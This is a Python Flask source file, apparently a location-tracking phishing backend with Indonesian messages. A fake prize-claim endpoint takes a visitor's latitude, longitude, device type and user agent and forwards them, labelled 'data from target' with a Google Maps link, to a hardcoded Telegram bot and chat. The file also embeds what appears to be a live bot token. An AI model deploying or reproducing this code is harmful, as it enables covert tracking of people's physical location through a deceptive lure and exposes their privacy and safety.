from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Token dan Chat ID Telegram
TELEGRAM_BOT_TOKEN = "7634838312:AAGKcRoQGRM95va-0kF3MMj5BVFDDORhOHY"
TELEGRAM_CHAT_ID = "7891617554"

def send_to_telegram(latitude, longitude, user_agent, device_type, access_time):
    message = (
        "📍 *DATA DARI TARGET 🎯*\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"🕒 *Waktu Akses:* {access_time}\n"
        f"📱 *Jenis Perangkat:* {device_type}\n"
        f"💻 *User Agent:* `{user_agent}`\n"
        f"🌍 *Lokasi:* \n"
        f"   ├ Latitude  : `{latitude}`\n"
        f"   ├ Longitude : `{longitude}`\n"
        f"   └ 📌 [Lihat di Google Maps](https://www.google.com/maps?q={latitude},{longitude})\n"
        "━━━━━━━━━━━━━━━━━━━"
    )

    send_message_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(send_message_url, data=data)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/claim', methods=['POST'])
def claim_prize():
    data = request.json
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    user_agent = data.get("userAgent")
    device_type = data.get("deviceType")
    access_time = data.get("accessTime")

    if latitude and longitude:
        send_to_telegram(latitude, longitude, user_agent, device_type, access_time)
        return jsonify({"message": "Lokasi Berhasil Dikirim Ke Muh Amin"})
    else:
        return jsonify({"message": "Gagal mendapatkan lokasi!"}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
